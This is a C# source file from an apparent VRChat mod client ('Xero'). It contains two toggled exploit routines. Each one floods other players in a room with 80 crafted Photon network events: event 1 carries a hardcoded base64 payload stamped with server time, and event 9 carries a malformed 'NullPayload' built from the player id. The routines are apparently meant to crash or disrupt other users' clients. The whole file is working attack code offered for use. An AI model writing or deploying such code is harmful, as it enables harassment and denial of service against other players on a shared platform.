using ExitGames.Client.Photon;
using Photon.Realtime;
using System;
using VRC.SDKBase;

namespace Xero
{
    internal class XeroEvent
    {
        public static bool EVENT1EXPLOIT;
        public static bool Event9Exploit;

        public static void event1()
        {
            if (EVENT1EXPLOIT == true)
            {
                byte[] array = Convert.FromBase64String("AgAAAKWkyYm7hjsA+H3owFygUv4w5B67lcSx14zff9FCPADiNbSwYWgE+O7DrSy5tkRecs21ljjofvebe6xsYlA4cVmgrd0=");
                Array src = new byte[4];
                byte[] bytes = BitConverter.GetBytes(Networking.GetServerTimeInMilliseconds());
                Buffer.BlockCopy(src, 0, array, 0, 4);
                Buffer.BlockCopy(bytes, 0, array, 4, 4);
                int num;
                for (int i = 0; i < 80; i = num + 1)
                {
                    OP.OpRaiseEvent(1, array, new RaiseEventOptions
                    {
                        field_Public_ReceiverGroup_0 = ReceiverGroup.Others,
                        field_Public_EventCaching_0 = EventCaching.DoNotCache
                    }, default(SendOptions));
                    num = i;
                }
            }
        }
        public static void event9()
        {
            if (Event9Exploit == true)
            { 
            byte[] NullPayload = new byte[8];
            Buffer.BlockCopy(BitConverter.GetBytes(int.Parse(Useful.LocalPlayer.playerId.ToString() + "00001")), 0, NullPayload, 0, 4);
                {
                    int num;
                    for (int i = 0; i < 80; i = num + 1)
                    {
                        OP.OpRaiseEvent(9, NullPayload, new RaiseEventOptions
                        {
                            field_Public_ReceiverGroup_0 = ReceiverGroup.Others,
                            field_Public_EventCaching_0 = EventCaching.DoNotCache
                        }, SendOptions.SendReliable);
                        num = i;
                    }
                }

            }
        }
    }
}
